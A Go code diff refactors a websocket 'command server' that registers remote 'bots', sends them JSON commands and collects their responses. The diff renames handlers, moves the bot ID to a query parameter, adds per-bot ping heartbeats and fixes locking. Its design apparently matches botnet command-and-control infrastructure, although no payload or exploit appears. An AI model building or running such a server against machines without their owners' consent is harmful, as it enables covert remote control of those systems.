@@ -26,7 +26,7 @@ type Bot struct {
 }
 
 func (b *Bot) String() string {
-	return fmt.Sprintf("%s | %s", b.ID, b.IP)
+	return fmt.Sprintf("%s|%s", b.ID, b.IP)
 }
 
 type CommandServer struct {
@@ -37,41 +37,54 @@ type CommandServer struct {
 	bots            map[string]*Bot
 	currentCommands map[string]*core.Command
 
-	onConnect     func(*Bot)
-	onDisconnect  func(*Bot)
-	onCommandResp func(*core.Command, []byte)
+	onConnectHandler     func(*Bot)
+	onDisconnectHandler  func(*Bot)
+	onCommandRespHandler func(*core.Command, []byte)
 }
 
 func NewCommandServer(addr string) *CommandServer {
 	return &CommandServer{
-		RWMutex:         new(sync.RWMutex),
-		addr:            addr,
-		upgrader:        websocket.Upgrader{},
+		RWMutex: new(sync.RWMutex),
+		addr:    addr,
+		upgrader: websocket.Upgrader{
+			HandshakeTimeout: 5 * time.Second,
+		},
 		bots:            make(map[string]*Bot),
 		currentCommands: make(map[string]*core.Command),
 
-		onConnect:     defaultBotEventHandler,
-		onDisconnect:  defaultBotEventHandler,
-		onCommandResp: defaultCommandRespHandler,
+		onConnectHandler:     defaultBotEventHandler,
+		onDisconnectHandler:  defaultBotEventHandler,
+		onCommandRespHandler: defaultCommandRespHandler,
 	}
 }
 
-func (s *CommandServer) OnConnect(h func(*Bot)) {
+func (s *CommandServer) SetOnConnect(h func(*Bot)) {
 	s.Lock()
-	s.onConnect = h
+	s.onConnectHandler = h
 	s.Unlock()
 }
 
-func (s *CommandServer) OnDisconnect(h func(*Bot)) {
+func (s *CommandServer) SetOnDisconnect(h func(*Bot)) {
 	s.Lock()
-	s.onDisconnect = h
+	s.onDisconnectHandler = h
 	s.Unlock()
 }
 
-func (s *CommandServer) OnCommandRespHandler(h func(*core.Command, []byte)) {
+func (s *CommandServer) SetOnCommandRespHandler(h func(*core.Command, []byte)) {
 	s.Lock()
-	s.onCommandResp = h
+	s.onCommandRespHandler = h
 	s.Unlock()
+}
+
+func (s *CommandServer) onDisconnect(bot *Bot) {
+	s.Lock()
+	delete(s.bots, bot.ID)
+	s.Unlock()
+	s.onDisconnectHandler(bot)
+}
+
+func (s *CommandServer) onConnect(bot *Bot) {
+	s.onConnectHandler(bot)
 }
 
 func (s *CommandServer) removeBot(bot *Bot) {
@@ -94,7 +107,9 @@ func (s *CommandServer) entrypoint(w http.ResponseWriter, r *http.Request) {
 		}
 		return
 	}
-	botId := r.Header.Get("X-UUID")
+
+	query := r.URL.Query()
+	botId := query.Get("uuid")
 	if botId == "" {
 		log.Println("connected bot with empty id")
 		return
@@ -104,9 +119,18 @@ func (s *CommandServer) entrypoint(w http.ResponseWriter, r *http.Request) {
 		IP:   r.RemoteAddr,
 		Conn: c,
 	}
+
+	s.startHeartBeating(bot)
+
 	if s.Debug {
 		log.Println("bot connected: ", bot.String())
 	}
+
+	c.SetCloseHandler(func(code int, text string) error {
+		s.onDisconnect(bot)
+		return nil
+	})
+
 	s.Lock()
 	s.bots[bot.ID] = bot
 	s.Unlock()
@@ -155,21 +179,22 @@ func (s *CommandServer) feedback(w http.ResponseWriter, r *http.Request) {
 	s.Lock()
 	delete(s.currentCommands, cmd.ID)
 	s.Unlock()
-	go s.onCommandResp(cmd, respBody)
+	go s.onCommandRespHandler(cmd, respBody)
 }
 
 func (s *CommandServer) SendCommand(c *core.Command, bot *Bot) error {
-	s.Lock()
-	defer s.Unlock()
-
+	s.RLock()
 	bot, ok := s.bots[bot.ID]
+	s.RUnlock()
 	if !ok {
 		return fmt.Errorf("command %s execution error: unknown bot ID %s", c.Name, bot.ID)
 	}
 
 	c.SetState(core.CommandStateExecuting)
 	c.SetTarget(bot.ID)
+	s.Lock()
 	s.currentCommands[c.ID] = c
+	s.Unlock()
 
 	if err := bot.Conn.WriteJSON(c); err != nil {
 		if s.Debug {
@@ -204,13 +229,26 @@ func (s *CommandServer) ListCommands() []*core.Command {
 	return commands
 }
 
-func (s *CommandServer) startHeartBeating() {
+func (s *CommandServer) DeleteCommand(cmdId string) {
+	s.Lock()
+	delete(s.currentCommands, cmdId)
+	s.Unlock()
+}
+
+func (s *CommandServer) startHeartBeating(bot *Bot) {
 	go func() {
-		for {
-			for _, bot := range s.bots {
-				_ = s.SendCommand(PingCommand(), bot)
+		ticker := time.NewTicker(time.Second)
+		defer func() {
+			ticker.Stop()
+			_ = bot.Conn.Close()
+		}()
+
+		for range ticker.C {
+			_ = bot.Conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
+			if err := bot.Conn.WriteMessage(websocket.PingMessage, nil); err != nil {
+				s.onDisconnect(bot)
+				return
 			}
-			time.Sleep(5 * time.Second)
 		}
 	}()
 }
@@ -218,6 +256,5 @@ func (s *CommandServer) startHeartBeating() {
 func (s *CommandServer) Run() {
 	http.HandleFunc("/in", s.entrypoint)
 	http.HandleFunc("/out", s.feedback)
-	s.startHeartBeating()
 	log.Fatal(http.ListenAndServe(s.addr, nil))
 }
